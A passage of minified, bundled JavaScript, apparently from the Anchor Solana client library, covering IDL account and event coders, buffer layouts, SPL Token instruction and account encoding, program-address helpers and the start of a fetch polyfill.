                const n = t.slice(8),
                    r = this.accountLayouts.get(e);
                if (!r) throw new Error(`Unknown account: ${e}`);
                return r.decode(n)
            }
            memcmp(e, t) {
                const n = ei.accountDiscriminator(e);
                return {
                    offset: 0,
                    bytes: ve().encode(t ? ge.Buffer.concat([n, t]) : n)
                }
            }
            size(e) {
                var t;
                return 8 + (null !== (t = Xr(this.idl, e)) && void 0 !== t ? t : 0)
            }
            static accountDiscriminator(e) {
                return ge.Buffer.from(_e.sha256.digest(`account:${ke()(e,{pascalCase:!0})}`)).slice(0, 8)
            }
        }
        class ti {
            constructor(e) {
                if (void 0 === e.events) return void(this.layouts = new Map);
                const t = e.events.map((t => {
                    let n = {
                        name: t.name,
                        type: {
                            kind: "struct",
                            fields: t.fields.map((e => ({
                                name: e.name,
                                type: e.type
                            })))
                        }
                    };
                    return [t.name, Gr.typeDefLayout(n, e.types)]
                }));
                this.layouts = new Map(t), this.discriminators = new Map(void 0 === e.events ? [] : e.events.map((e => [Se.fromByteArray(ni(e.name)), e.name])))
            }
            decode(e) {
                let t;
                try {
                    t = ge.Buffer.from(Se.toByteArray(e))
                } catch (Ao) {
                    return null
                }
                const n = Se.fromByteArray(t.slice(0, 8)),
                    r = this.discriminators.get(n);
                if (void 0 === r) return null;
                const i = this.layouts.get(r);
                if (!i) throw new Error(`Unknown event: ${r}`);
                return {
                    data: i.decode(t.slice(8)),
                    name: r
                }
            }
        }

        function ni(e) {
            return ge.Buffer.from(_e.sha256.digest(`event:${e}`)).slice(0, 8)
        }
        const ri = new Set(["anchor-deprecated-state", "debug-logs"]),
            ii = new Map;

        function oi(e) {
            return void 0 !== ii.get(e)
        }
        var si = Object.freeze({
            __proto__: null,
            set: function(e) {
                if (!ri.has(e)) throw new Error("Invalid feature");
                ii.set(e, !0)
            },
            isSet: oi
        });
        class ai {
            constructor(e) {
                if (void 0 === e.state) throw new Error("Idl state not defined.");
                this.layout = Gr.typeDefLayout(e.state.struct, e.types)
            }
            async encode(e, t) {
                const n = ge.Buffer.alloc(1e3),
                    r = this.layout.encode(t, n),
                    i = await ui(e),
                    o = n.slice(0, r);
                return ge.Buffer.concat([i, o])
            }
            decode(e) {
                const t = e.slice(8);
                return this.layout.decode(t)
            }
        }
        async function ui(e) {
            let t = oi("anchor-deprecated-state") ? "account" : "state";
            return ge.Buffer.from(_e.sha256.digest(`${t}:${e}`)).slice(0, 8)
        }
        class ci {
            constructor(e) {
                this.instruction = new Yr(e), this.accounts = new ei(e), this.events = new ti(e), e.state && (this.state = new ai(e))
            }
        }
        var li = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : "undefined" != typeof __webpack_require__.g ? __webpack_require__.g : "undefined" != typeof self ? self : {};
        class fi {
            constructor(e, t) {
                if (!Number.isInteger(e)) throw new TypeError("span must be an integer");
                this.span = e, this.property = t
            }
            makeDestinationObject() {
                return {}
            }
            decode(e, t) {
                throw new Error("Layout is abstract")
            }
            encode(e, t, n) {
                throw new Error("Layout is abstract")
            }
            getSpan(e, t) {
                if (0 > this.span) throw new RangeError("indeterminate span");
                return this.span
            }
            replicate(e) {
                const t = Object.create(this.constructor.prototype);
                return Object.assign(t, this), t.property = e, t
            }
            fromArray(e) {}
        }
        var hi = fi;
        class di extends fi {
            isCount() {
                throw new Error("ExternalLayout is abstract")
            }
        }
        class pi extends di {
            constructor(e, t, n) {
                if (!(e instanceof fi)) throw new TypeError("layout must be a Layout");
                if (void 0 === t) t = 0;
                else if (!Number.isInteger(t)) throw new TypeError("offset must be integer or undefined");
                super(e.span, n || e.property), this.layout = e, this.offset = t
            }
            isCount() {
                return this.layout instanceof yi || this.layout instanceof gi
            }
            decode(e, t) {
                return void 0 === t && (t = 0), this.layout.decode(e, t + this.offset)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), this.layout.encode(e, t, n + this.offset)
            }
        }
        class yi extends fi {
            constructor(e, t) {
                if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readUIntLE(t, this.span)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeUIntLE(e, n, this.span), this.span
            }
        }
        class gi extends fi {
            constructor(e, t) {
                if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readUIntBE(t, this.span)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeUIntBE(e, n, this.span), this.span
            }
        }
        const mi = Math.pow(2, 32);
        class wi extends fi {
            constructor(e) {
                super(8, e)
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = e.readUInt32LE(t);
                return function(e, t) {
                    return e * mi + t
                }(e.readUInt32LE(t + 4), n)
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = function(e) {
                    const t = Math.floor(e / mi);
                    return {
                        hi32: t,
                        lo32: e - t * mi
                    }
                }(e);
                return t.writeUInt32LE(r.lo32, n), t.writeUInt32LE(r.hi32, n + 4), 8
            }
        }
        class bi extends fi {
            constructor(e, t, n) {
                if (!Array.isArray(e) || !e.reduce(((e, t) => e && t instanceof fi), !0)) throw new TypeError("fields must be array of Layout instances");
                "boolean" == typeof t && void 0 === n && (n = t, t = void 0);
                for (const i of e)
                    if (0 > i.span && void 0 === i.property) throw new Error("fields cannot contain unnamed variable-length layout");
                let r = -1;
                try {
                    r = e.reduce(((e, t) => e + t.getSpan()), 0)
                } catch (e) {}
                super(r, t), this.fields = e, this.decodePrefixes = !!n
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                let n = 0;
                try {
                    n = this.fields.reduce(((n, r) => {
                        const i = r.getSpan(e, t);
                        return t += i, n + i
                    }), 0)
                } catch (e) {
                    throw new RangeError("indeterminate span")
                }
                return n
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = this.makeDestinationObject();
                for (const r of this.fields)
                    if (void 0 !== r.property && (n[r.property] = r.decode(e, t)), t += r.getSpan(e, t), this.decodePrefixes && e.length === t) break;
                return n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = n;
                let i = 0,
                    o = 0;
                for (const s of this.fields) {
                    let r = s.span;
                    if (o = 0 < r ? r : 0, void 0 !== s.property) {
                        const i = e[s.property];
                        void 0 !== i && (o = s.encode(i, t, n), 0 > r && (r = s.getSpan(t, n)))
                    }
                    i = n, n += r
                }
                return i + o - r
            }
            fromArray(e) {
                const t = this.makeDestinationObject();
                for (const n of this.fields) void 0 !== n.property && 0 < e.length && (t[n.property] = e.shift());
                return t
            }
            layoutFor(e) {
                if ("string" != typeof e) throw new TypeError("property must be string");
                for (const t of this.fields)
                    if (t.property === e) return t
            }
            offsetOf(e) {
                if ("string" != typeof e) throw new TypeError("property must be string");
                let t = 0;
                for (const n of this.fields) {
                    if (n.property === e) return t;
                    0 > n.span ? t = -1 : 0 <= t && (t += n.span)
                }
            }
        }
        class vi {
            constructor(e) {
                this.property = e
            }
            decode() {
                throw new Error("UnionDiscriminator is abstract")
            }
            encode() {
                throw new Error("UnionDiscriminator is abstract")
            }
        }
        class Ai extends vi {
            constructor(e, t) {
                if (!(e instanceof di && e.isCount())) throw new TypeError("layout must be an unsigned integer ExternalLayout");
                super(t || e.property || "variant"), this.layout = e
            }
            decode(e, t) {
                return this.layout.decode(e, t)
            }
            encode(e, t, n) {
                return this.layout.encode(e, t, n)
            }
        }
        class ki extends fi {
            constructor(e, t, n) {
                const r = e instanceof yi || e instanceof gi;
                if (r) e = new Ai(new pi(e));
                else if (e instanceof di && e.isCount()) e = new Ai(e);
                else if (!(e instanceof vi)) throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");
                if (void 0 === t && (t = null), !(null === t || t instanceof fi)) throw new TypeError("defaultLayout must be null or a Layout");
                if (null !== t) {
                    if (0 > t.span) throw new Error("defaultLayout must have constant span");
                    void 0 === t.property && (t = t.replicate("content"))
                }
                let i = -1;
                t && (i = t.span, 0 <= i && r && (i += e.layout.span)), super(i, n), this.discriminator = e, this.usesPrefixDiscriminator = r, this.defaultLayout = t, this.registry = {};
                let o = this.defaultGetSourceVariant.bind(this);
                this.getSourceVariant = function(e) {
                    return o(e)
                }, this.configGetSourceVariant = function(e) {
                    o = e.bind(this)
                }
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                const n = this.getVariant(e, t);
                if (!n) throw new Error("unable to determine span for unrecognized variant");
                return n.getSpan(e, t)
            }
            defaultGetSourceVariant(e) {
                if (e.hasOwnProperty(this.discriminator.property)) {
                    if (this.defaultLayout && e.hasOwnProperty(this.defaultLayout.property)) return;
                    const t = this.registry[e[this.discriminator.property]];
                    if (t && (!t.layout || e.hasOwnProperty(t.property))) return t
                } else
                    for (const t in this.registry) {
                        const n = this.registry[t];
                        if (e.hasOwnProperty(n.property)) return n
                    }
                throw new Error("unable to infer src variant")
            }
            decode(e, t) {
                let n;
                void 0 === t && (t = 0);
                const r = this.discriminator,
                    i = r.decode(e, t);
                let o = this.registry[i];
                if (void 0 === o) {
                    let s = 0;
                    o = this.defaultLayout, this.usesPrefixDiscriminator && (s = r.layout.span), n = this.makeDestinationObject(), n[r.property] = i, n[o.property] = this.defaultLayout.decode(e, t + s)
                } else n = o.decode(e, t);
                return n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                const r = this.getSourceVariant(e);
                if (void 0 === r) {
                    const r = this.discriminator,
                        i = this.defaultLayout;
                    let o = 0;
                    return this.usesPrefixDiscriminator && (o = r.layout.span), r.encode(e[r.property], t, n), o + i.encode(e[i.property], t, n + o)
                }
                return r.encode(e, t, n)
            }
            addVariant(e, t, n) {
                const r = new _i(this, e, t, n);
                return this.registry[e] = r, r
            }
            getVariant(e, t) {
                let n = e;
                return Buffer.isBuffer(e) && (void 0 === t && (t = 0), n = this.discriminator.decode(e, t)), this.registry[n]
            }
        }
        class _i extends fi {
            constructor(e, t, n, r) {
                if (!(e instanceof ki)) throw new TypeError("union must be a Union");
                if (!Number.isInteger(t) || 0 > t) throw new TypeError("variant must be a (non-negative) integer");
                if ("string" == typeof n && void 0 === r && (r = n, n = null), n) {
                    if (!(n instanceof fi)) throw new TypeError("layout must be a Layout");
                    if (null !== e.defaultLayout && 0 <= n.span && n.span > e.defaultLayout.span) throw new Error("variant span exceeds span of containing union");
                    if ("string" != typeof r) throw new TypeError("variant must have a String property")
                }
                let i = e.span;
                0 > e.span && (i = n ? n.span : 0, 0 <= i && e.usesPrefixDiscriminator && (i += e.discriminator.layout.span)), super(i, r), this.union = e, this.variant = t, this.layout = n || null
            }
            getSpan(e, t) {
                if (0 <= this.span) return this.span;
                void 0 === t && (t = 0);
                let n = 0;
                return this.union.usesPrefixDiscriminator && (n = this.union.discriminator.layout.span), n + this.layout.getSpan(e, t + n)
            }
            decode(e, t) {
                const n = this.makeDestinationObject();
                if (void 0 === t && (t = 0), this !== this.union.getVariant(e, t)) throw new Error("variant mismatch");
                let r = 0;
                return this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout ? n[this.property] = this.layout.decode(e, t + r) : this.property ? n[this.property] = !0 : this.union.usesPrefixDiscriminator && (n[this.union.discriminator.property] = this.variant), n
            }
            encode(e, t, n) {
                void 0 === n && (n = 0);
                let r = 0;
                if (this.union.usesPrefixDiscriminator && (r = this.union.discriminator.layout.span), this.layout && !e.hasOwnProperty(this.property)) throw new TypeError("variant lacks property " + this.property);
                this.union.discriminator.encode(this.variant, t, n);
                let i = r;
                if (this.layout && (this.layout.encode(e[this.property], t, n + r), i += this.layout.getSpan(t, n + r), 0 <= this.union.span && i > this.union.span)) throw new Error("encoded variant overruns containing union");
                return i
            }
            fromArray(e) {
                if (this.layout) return this.layout.fromArray(e)
            }
        }
        class Ei extends fi {
            constructor(e, t) {
                if (!(e instanceof di && e.isCount() || Number.isInteger(e) && 0 <= e)) throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");
                let n = -1;
                e instanceof di || (n = e), super(n, t), this.length = e
            }
            getSpan(e, t) {
                let n = this.span;
                return 0 > n && (n = this.length.decode(e, t)), n
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                let n = this.span;
                return 0 > n && (n = this.length.decode(e, t)), e.slice(t, t + n)
            }
            encode(e, t, n) {
                let r = this.length;
                if (this.length instanceof di && (r = e.length), !Buffer.isBuffer(e) || r !== e.length) throw new TypeError((i = "Blob.encode", (this.property ? i + "[" + this.property + "]" : i) + " requires (length " + r + ") Buffer as src"));
                var i;
                if (n + r > t.length) throw new RangeError("encoding overruns Buffer");
                return t.write(e.toString("hex"), n, r, "hex"), this.length instanceof di && this.length.encode(r, t, n), r
            }
        }
        var Si = e => new yi(1, e),
            Ii = e => new wi(e),
            xi = (e, t, n) => new bi(e, t, n),
            Mi = (e, t) => new Ei(e, t);
        class Bi {
            constructor(e) {}
            encode(e, t) {
                switch (ke()(e)) {
                    case "initializeMint":
                        return function(e) {
                            let {
                                decimals: t,
                                mintAuthority: n,
                                freezeAuthority: r
                            } = e;
                            return Pi({
                                initializeMint: {
                                    decimals: t,
                                    mintAuthority: n.toBuffer(),
                                    freezeAuthorityOption: !!r,
                                    freezeAuthority: (r || _.PublicKey.default).toBuffer()
                                }
                            })
                        }(t);
                    case "initializeAccount":
                        return Pi({
                            initializeAccount: {}
                        });
                    case "initializeMultisig":
                        return function(e) {
                            let {
                                m: t
                            } = e;
                            return Pi({
                                initializeMultisig: {
                                    m: t
                                }
                            })
                        }(t);
                    case "transfer":
                        return function(e) {
                            let {
                                amount: t
                            } = e;
                            return Pi({
                                transfer: {
                                    amount: t
                                }
                            })
                        }(t);
                    case "approve":
                        return function(e) {
                            let {
                                amount: t
                            } = e;
                            return Pi({
                                approve: {
                                    amount: t
                                }
                            })
                        }(t);
                    case "revoke":
                        return Pi({
                            revoke: {}
                        });
                    case "setAuthority":
                        return function(e) {
                            let {
                                authorityType: t,
                                newAuthority: n
                            } = e;
                            return Pi({
                                setAuthority: {
                                    authorityType: t,
                                    newAuthority: n
                                }
                            })
                        }(t);
                    case "mintTo":
                        return function(e) {
                            let {
                                amount: t
                            } = e;
                            return Pi({
                                mintTo: {
                                    amount: t
                                }
                            })
                        }(t);
                    case "burn":
                        return function(e) {
                            let {
                                amount: t
                            } = e;
                            return Pi({
                                burn: {
                                    amount: t
                                }
                            })
                        }(t);
                    case "closeAccount":
                        return Pi({
                            closeAccount: {}
                        });
                    case "freezeAccount":
                        return Pi({
                            freezeAccount: {}
                        });
                    case "thawAccount":
                        return Pi({
                            thawAccount: {}
                        });
                    case "transferChecked":
                        return function(e) {
                            let {
                                amount: t,
                                decimals: n
                            } = e;
                            return Pi({
                                transferChecked: {
                                    amount: t,
                                    decimals: n
                                }
                            })
                        }(t);
                    case "approvedChecked":
                        return function(e) {
                            let {
                                amount: t,
                                decimals: n
                            } = e;
                            return Pi({
                                approveChecked: {
                                    amount: t,
                                    decimals: n
                                }
                            })
                        }(t);
                    case "mintToChecked":
                        return function(e) {
                            let {
                                amount: t,
                                decimals: n
                            } = e;
                            return Pi({
                                mintToChecked: {
                                    amount: t,
                                    decimals: n
                                }
                            })
                        }(t);
                    case "burnChecked":
                        return function(e) {
                            let {
                                amount: t,
                                decimals: n
                            } = e;
                            return Pi({
                                burnChecked: {
                                    amount: t,
                                    decimals: n
                                }
                            })
                        }(t);
                    case "intializeAccount2":
                        return function(e) {
                            let {
                                authority: t
                            } = e;
                            return Pi({
                                initilaizeAccount2: {
                                    authority: t
                                }
                            })
                        }(t);
                    case "syncNative":
                        return Pi({
                            syncNative: {}
                        });
                    case "initializeAccount3":
                        return function(e) {
                            let {
                                authority: t
                            } = e;
                            return Pi({
                                initializeAccount3: {
                                    authority: t
                                }
                            })
                        }(t);
                    case "initializeMultisig2":
                        return function(e) {
                            let {
                                m: t
                            } = e;
                            return Pi({
                                initializeMultisig2: {
                                    m: t
                                }
                            })
                        }(t);
                    case "initializeMint2":
                        return function(e) {
                            let {
                                decimals: t,
                                mintAuthority: n,
                                freezeAuthority: r
                            } = e;
                            return Pi({
                                encodeInitializeMint2: {
                                    decimals: t,
                                    mintAuthority: n,
                                    freezeAuthority: r
                                }
                            })
                        }(t);
                    default:
                        throw new Error(`Invalid instruction: ${e}`)
                }
            }
            encodeState(e, t) {
                throw new Error("SPL token does not have state")
            }
        }
        const Ti = (Oi = Si("instruction"), new ki(Oi, undefined, undefined));
        var Oi;

        function Ci(e) {
            return Mi(32, e)
        }

        function Pi(e) {
            let t = Buffer.alloc(Li),
                n = Ti.encode(e, t);
            return t.slice(0, n)
        }
        Ti.addVariant(0, xi([Si("decimals"), Mi(32, "mintAuthority"), Si("freezeAuthorityOption"), Ci("freezeAuthority")]), "initializeMint"), Ti.addVariant(1, xi([]), "initializeAccount"), Ti.addVariant(2, xi([Si("m")]), "initializeMultisig"), Ti.addVariant(3, xi([Ii("amount")]), "transfer"), Ti.addVariant(4, xi([Ii("amount")]), "approve"), Ti.addVariant(5, xi([]), "revoke"), Ti.addVariant(6, xi([Si("authorityType"), Si("newAuthorityOption"), Ci("newAuthority")]), "setAuthority"), Ti.addVariant(7, xi([Ii("amount")]), "mintTo"), Ti.addVariant(8, xi([Ii("amount")]), "burn"), Ti.addVariant(9, xi([]), "closeAccount"), Ti.addVariant(10, xi([]), "freezeAccount"), Ti.addVariant(11, xi([]), "thawAccount"), Ti.addVariant(12, xi([Ii("amount"), Si("decimals")]), "transferChecked"), Ti.addVariant(13, xi([Ii("amount"), Si("decimals")]), "approvedChecked"), Ti.addVariant(14, xi([Ii("amount"), Si("decimals")]), "mintToChecked"), Ti.addVariant(15, xi([Ii("amount"), Si("decimals")]), "burnedChecked"), Ti.addVariant(16, xi([Ci("authority")]), "InitializeAccount2"), Ti.addVariant(17, xi([]), "syncNative"), Ti.addVariant(18, xi([Ci("authority")]), "initializeAccount3"), Ti.addVariant(19, xi([Si("m")]), "initializeMultisig2"), Ti.addVariant(20, xi([Si("decimals"), Ci("mintAuthority"), Si("freezeAuthorityOption"), Ci("freezeAuthority")]), "initializeMint2");
        const Li = Math.max(...Object.values(Ti.registry).map((e => e.span)));
        class Ni {
            constructor(e) {}
            encode(e, t) {
                throw new Error("SPL token does not have state")
            }
            decode(e) {
                throw new Error("SPL token does not have state")
            }
        }

        function Ri(e) {
            return new Ui(Mi(8), (e => Wi.fromBuffer(e)), (e => e.toBuffer()), e)
        }

        function Di(e) {
            return new Ui(Mi(32), (e => new _.PublicKey(e)), (e => e.toBuffer()), e)
        }

        function zi(e, t) {
            return new ji(e, t)
        }
        class Ui extends hi {
            constructor(e, t, n, r) {
                super(e.span, r), this.layout = e, this.decoder = t, this.encoder = n
            }
            decode(e, t) {
                return this.decoder(this.layout.decode(e, t))
            }
            encode(e, t, n) {
                return this.layout.encode(this.encoder(e), t, n)
            }
            getSpan(e, t) {
                return this.layout.getSpan(e, t)
            }
        }
        class ji extends hi {
            constructor(e, t) {
                super(-1, t), this.layout = e, this.discriminator = new yi(4, void 0)
            }
            encode(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                return null == e ? this.layout.span + this.discriminator.encode(0, t, n) : (this.discriminator.encode(1, t, n), this.layout.encode(e, t, n + 4) + 4)
            }
            decode(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                const n = this.discriminator.decode(e, t);
                if (0 === n) return null;
                if (1 === n) return this.layout.decode(e, t + 4);
                throw new Error("Invalid coption " + this.property)
            }
            getSpan(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                return this.layout.getSpan(e, t + 4) + 4
            }
        }

        function Fi(e) {
            if (0 === e) return !1;
            if (1 === e) return !0;
            throw new Error("Invalid bool: " + e)
        }

        function Hi(e) {
            return e ? 1 : 0
        }
        class Wi extends(we()) {
            toBuffer() {
                const e = super.toArray().reverse(),
                    t = Buffer.from(e);
                if (8 === t.length) return t;
                if (t.length >= 8) throw new Error("u64 too large");
                const n = Buffer.alloc(8);
                return t.copy(n), n
            }
            static fromBuffer(e) {
                if (8 !== e.length) throw new Error(`Invalid buffer length: ${e.length}`);
                return new Wi([...e].reverse().map((e => `00${e.toString(16)}`.slice(-2))).join(""), 16)
            }
        }
        class Ki {
            constructor(e) {
                this.idl = e
            }
            async encode(e, t) {
                switch (e) {
                    case "Token":
                        {
                            const e = Buffer.alloc(165),
                                n = Vi.encode(t, e);
                            return e.slice(0, n)
                        }
                    case "Mint":
                        {
                            const e = Buffer.alloc(82),
                                n = qi.encode(t, e);
                            return e.slice(0, n)
                        }
                    default:
                        throw new Error(`Invalid account name: ${e}`)
                }
            }
            decode(e, t) {
                return this.decodeUnchecked(e, t)
            }
            decodeUnchecked(e, t) {
                switch (e) {
                    case "Token":
                        return function(e) {
                            return Vi.decode(e)
                        }(t);
                    case "Mint":
                        return function(e) {
                            return qi.decode(e)
                        }(t);
                    default:
                        throw new Error(`Invalid account name: ${e}`)
                }
            }
            memcmp(e, t) {
                switch (e) {
                    case "Token":
                        return {
                            dataSize: 165
                        };
                    case "Mint":
                        return {
                            dataSize: 82
                        };
                    default:
                        throw new Error(`Invalid account name: ${e}`)
                }
            }
            size(e) {
                var t;
                return null !== (t = Xr(this.idl, e)) && void 0 !== t ? t : 0
            }
        }
        const qi = xi([zi(Di(), "mintAuthority"), Ri("supply"), Si("decimals"), new Ui(Si(), Fi, Hi, "isInitialized"), zi(Di(), "freezeAuthority")]),
            Vi = xi([Di("mint"), Di("authority"), Ri("amount"), zi(Di(), "delegate"), Si("state"), zi(Ri(), "isNative"), Ri("delegatedAmount"), zi(Di(), "closeAuthority")]);
        class Qi {
            constructor(e) {}
            decode(e) {
                throw new Error("SPL token program does not have events")
            }
        }
        class Gi {
            constructor(e) {
                this.instruction = new Bi(e), this.accounts = new Ki(e), this.events = new Qi(e), this.state = new Ni(e)
            }
        }
        var Yi = Object.freeze({
            __proto__: null,
            hash: function(e) {
                return (0, _e.sha256)(e)
            }
        });

        function Zi(e) {
            const t = new Map;
            return e.errors && e.errors.forEach((e => {
                var n;
                let r = null !== (n = e.msg) && void 0 !== n ? n : e.name;
                t.set(e.code, r)
            })), t
        }

        function Ji(e) {
            for (var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
            if (e.args.length != n.length) throw new Error("Invalid argument length");
            const i = {};
            let o = 0;
            return e.args.forEach((e => {
                i[e.name] = n[o], o += 1
            })), i
        }

        function Xi(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            e.forEach((e => {
                if ("accounts" in e) Xi(e.accounts, t[e.name]);
                else if (void 0 === t[e.name]) throw new Error(`Invalid arguments: ${e.name} not provided.`)
            }))
        }

        function $i(e) {
            return e instanceof _.PublicKey ? e : new _.PublicKey(e)
        }
        async function eo(e, t, n) {
            if (t.length <= 99) return await to(e, t, n); {
                const i = (r = t, 99, Array.apply(0, new Array(Math.ceil(r.length / 99))).map(((e, t) => r.slice(99 * t, 99 * (t + 1)))));
                return (await Promise.all(i.map((t => to(e, t, n))))).flat()
            }
            var r
        }
        async function to(e, t, n) {
            const r = null != n ? n : e.commitment,
                i = [t.map((e => e.toBase58()))];
            r && i.push({
                commitment: r
            });
            const o = await e._rpcRequest("getMultipleAccounts", i);
            if (o.error) throw new Error("failed to get info about accounts " + t.map((e => e.toBase58())).join(", ") + ": " + o.error.message);
            xe()(void 0 !== o.result);
            const s = [];
            for (const a of o.result.value) {
                let e = null;
                if (null !== a) {
                    if (o.result.value) {
                        const {
                            executable: t,
                            owner: n,
                            lamports: r,
                            data: i
                        } = a;
                        xe()("base64" === i[1]), e = {
                            executable: t,
                            owner: new _.PublicKey(n),
                            lamports: r,
                            data: ge.Buffer.from(i[0], "base64")
                        }
                    }
                    if (null === e) throw new Error("Invalid response");
                    s.push(e)
                } else s.push(null)
            }
            return s.map(((e, n) => null === e ? null : {
                publicKey: t[n],
                account: e
            }))
        }
        var no = Object.freeze({
            __proto__: null,
            invoke: async function(e, t, n, r) {
                e = $i(e), r || (r = Dr());
                const i = new _.Transaction;
                return i.add(new _.TransactionInstruction({
                    programId: e,
                    keys: null != t ? t : [],
                    data: n
                })), await r.send(i)
            },
            getMultipleAccounts: eo
        });

        function ro(e, t, n) {
            const r = ge.Buffer.concat([e.toBuffer(), ge.Buffer.from(t), n.toBuffer()]),
                i = _e.sha256.digest(r);
            return new _.PublicKey(ge.Buffer.from(i))
        }

        function io(e, t) {
            let n = ge.Buffer.alloc(0);
            e.forEach((function(e) {
                if (e.length > 32) throw new TypeError("Max seed length exceeded");
                n = ge.Buffer.concat([n, so(e)])
            })), n = ge.Buffer.concat([n, t.toBuffer(), ge.Buffer.from("ProgramDerivedAddress")]);
            let r = (0, _e.sha256)(new Uint8Array(n)),
                i = new(we())(r, 16).toArray(void 0, 32);
            if (_.PublicKey.isOnCurve(new Uint8Array(i))) throw new Error("Invalid seeds, address must fall off the curve");
            return new _.PublicKey(i)
        }

        function oo(e, t) {
            let n, r = 255;
            for (; 0 != r;) {
                try {
                    n = io(e.concat(ge.Buffer.from([r])), t)
                } catch (Ao) {
                    if (Ao instanceof TypeError) throw Ao;
                    r--;
                    continue
                }
                return [n, r]
            }
            throw new Error("Unable to find a viable program address nonce")
        }
        const so = e => e instanceof ge.Buffer ? e : e instanceof Uint8Array ? ge.Buffer.from(e.buffer, e.byteOffset, e.byteLength) : ge.Buffer.from(e);
        async function ao(e) {
            let t = [ge.Buffer.from([97, 110, 99, 104, 111, 114])];
            for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
            r.forEach((e => {
                t.push(e instanceof ge.Buffer ? e : $i(e).toBuffer())
            }));
            const [o] = await _.PublicKey.findProgramAddress(t, $i(e));
            return o
        }
        var uo = Object.freeze({
                __proto__: null,
                createWithSeedSync: ro,
                createProgramAddressSync: io,
                findProgramAddressSync: oo,
                associated: ao
            }),
            co = Object.freeze({
                __proto__: null,
                encode: function(e) {
                    return e.reduce(((e, t) => e + t.toString(16).padStart(2, "0")), "0x")
                },
                decode: function(e) {
                    0 === e.indexOf("0x") && (e = e.substr(2)), e.length % 2 == 1 && (e = "0" + e);
                    let t = e.match(/.{2}/g);
                    return null === t ? ge.Buffer.from([]) : ge.Buffer.from(t.map((e => parseInt(e, 16))))
                }
            });

        function lo(e) {
            return new TextDecoder("utf-8").decode(e)
        }

        function fo(e) {
            return (new TextEncoder).encode(e)
        }
        var ho = Object.freeze({
                __proto__: null,
                decode: lo,
                encode: fo
            }),
            po = Object.freeze({
                __proto__: null,
                encode: function(e) {
                    return ve().encode(e)
                },
                decode: function(e) {
                    return ve().decode(e)
                }
            }),
            yo = Object.freeze({
                __proto__: null,
                encode: function(e) {
                    return Se.fromByteArray(e)
                },
                decode: function(e) {
                    return ge.Buffer.from(Se.toByteArray(e))
                }
            }),
            go = Object.freeze({
                __proto__: null,
                hex: co,
                utf8: ho,
                bs58: po,
                base64: yo
            });
        const mo = new _.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
            wo = new _.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
        var bo = Object.freeze({
                __proto__: null,
                TOKEN_PROGRAM_ID: mo,
                ASSOCIATED_PROGRAM_ID: wo,
                associatedAddress: async function(e) {
                    let {
                        mint: t,
                        owner: n
                    } = e;
                    return (await _.PublicKey.findProgramAddress([n.toBuffer(), mo.toBuffer(), t.toBuffer()], wo))[0]
                }
            }),
            vo = {
                exports: {}
            };
        ! function(e, t) {
            var n = "undefined" != typeof self ? self : li,
                r = function() {
                    function e() {
                        this.fetch = !1, this.DOMException = n.DOMException
                    }
                    return e.prototype = n, new e
                }();
            ! function(e) {
                ! function(t) {
                    var n = "URLSearchParams" in e,
                        r = "Symbol" in e && "iterator" in Symbol,
                        i = "FileReader" in e && "Blob" in e && function() {
                            try {
                                return new Blob, !0
                            } catch (e) {
                                return !1
                            }
                        }(),
                        o = "FormData" in e,
                        s = "ArrayBuffer" in e;
                    if (s) var a = ["[object Int8Array]", "[object Uint8Array]", "[object Uint8ClampedArray]", "[object Int16Array]", "[object Uint16Array]", "[object Int32Array]", "[object Uint32Array]", "[object Float32Array]", "[object Float64Array]"],
                        u = ArrayBuffer.isView || function(e) {
                            return e && a.indexOf(Object.prototype.toString.call(e)) > -1
                        };

                    function c(e) {
                        if ("string" != typeof e && (e = String(e)), /[^a-z0-9\-#$%&'*+.^_`|~]/i.test(e)) throw new TypeError("Invalid character in header field name");
                        return e.toLowerCase()
                    }

                    function l(e) {
                        return "string" != typeof e && (e = String(e)), e
                    }

                    function f(e) {
                        var t = {
                            next: function() {
                                var t = e.shift();
                                return {
                                    done: void 0 === t,
                                    value: t
                                }
                            }
                        };
                        return r && (t[Symbol.iterator] = function() {
                            return t
                        }), t
                    }

                    function h(e) {
                        this.map = {}, e instanceof h ? e.forEach((function(e, t) {
                            this.append(t, e)
                        }), this) : Array.isArray(e) ? e.forEach((function(e) {
                            this.append(e[0], e[1])
                        }), this) : e && Object.getOwnPropertyNames(e).forEach((function(t) {
                            this.append(t, e[t])
                        }), this)
                    }

                    function d(e) {
                        if (e.bodyUsed) return Promise.reject(new TypeError("Already read"));
                        e.bodyUsed = !0
                    }

                    function p(e) {
                        return new Promise((function(t, n) {
                            e.onload = function() {
                                t(e.result)
                            }, e.onerror = function() {
                                n(e.error)
                            }
                        }))
                    }

                    function y(e) {
                        var t = new FileReader,
                            n = p(t);
                        return t.readAsArrayBuffer(e), n
